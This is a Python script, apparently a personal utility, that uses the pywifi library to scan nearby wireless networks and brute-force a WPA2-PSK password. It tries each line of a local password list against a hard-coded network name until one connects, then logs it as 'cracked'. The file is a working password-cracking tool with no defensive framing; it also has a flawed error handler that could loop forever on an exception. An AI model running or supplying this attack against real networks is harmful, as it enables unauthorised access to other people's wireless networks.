# -*- coding:utf-8 -*-
'''
Created on 2018年12月14日
get wifi
@author: user
'''
import os, sys
import logging
import itertools
import requests, json
from bs4 import BeautifulSoup 
from importlib import reload
import random, time
import brotli
import pywifi
from pywifi.wifi import PyWiFi

from pywifi import const

reload(sys)  
# sys.setdefaultencoding('utf8')

PY_GEN_PATH = "E:/data/priv".replace('/', os.sep)
logger = logging.getLogger('wifi_check_dev')
LOG_FILE = 'wifi_check_dev.log'
LOG_FORMATTER = '%(message)s'
# LOG_FORMATTER = '%(asctime)s-%(levelname)s - %(filename)s - %(funcName)s - %(lineno)d - %(message)s'
AKMS = {
0:'AKM_TYPE_NONE',
1:'AKM_TYPE_WPA',
2:'AKM_TYPE_WPAPSK',
3:'AKM_TYPE_WPA2',
4:'AKM_TYPE_WPA2PSK',
5:'AKM_TYPE_UNKNOWN'
}


def config_logger():
    logger.setLevel(logging.DEBUG)
    if not os.path.exists(PY_GEN_PATH):
        logger.info("文件夹不存在,已自行创建")
        os.makedirs(PY_GEN_PATH, 777)
    handler = logging.FileHandler(os.path.join(PY_GEN_PATH, LOG_FILE))
    handler.setLevel(logging.DEBUG)
    fmter = logging.Formatter(LOG_FORMATTER)
    handler.setFormatter(fmter)
    logger.addHandler(handler)
    
    # 控制台打印
    console = logging.StreamHandler()
    console.setLevel(level=logging.DEBUG)  # 设置为INFO级别
    console.setFormatter(fmter)
    logger.addHandler(console)

 
# 测试连接，返回链接结果
def wifiConnect(ssid, pwd):
    # 抓取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # 要连接WiFi的名称
        # profile.ssid = "BVF"
        profile.ssid = ssid
        # 网卡的开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法,一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 调用密码
        profile.key = pwd
        # 删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        # wifi连接时间
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接") 

 
# 读取密码本
def readPassword(ssid):
    # print("开始破解:")
    # 密码本路径
    path = PY_GEN_PATH + '/wifi_pwd1.log'
    # 打开文件
    # file = open(path, "r")
    with open(path, 'r', encoding='utf-8') as f:
        # 一行一行读取
        pad = f.readline().strip()
        while pad:
            try:
                isconn = wifiConnect(ssid, pad)
                if isconn:
                    logger.info('cracked:{}'.format(str(pad)))
                    break
                else:
                    logger.info('checking:{}'.format(str(pad)))
                    pad = f.readline().strip()
            except:
                continue


def get_wireless_info():
    # 创建一个无线对象wifi
    wifi = PyWiFi()
    # 取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 扫描附近的无线信号
    # ifaces.scan()
    wireless_lst = ifaces.scan_results()
    for d in wireless_lst:
        ssid = d.ssid
        encry_method = AKMS[d.akm[0]]
        logger.info('ssid:{}|method:{}'.format(str(ssid), str(encry_method)))

# readPassword()


if __name__ == '__main__':
    config_logger()
    # ssid = 'BVF'
    ssid = 'zampwifi'
    readPassword(ssid)
    # get_wireless_info()
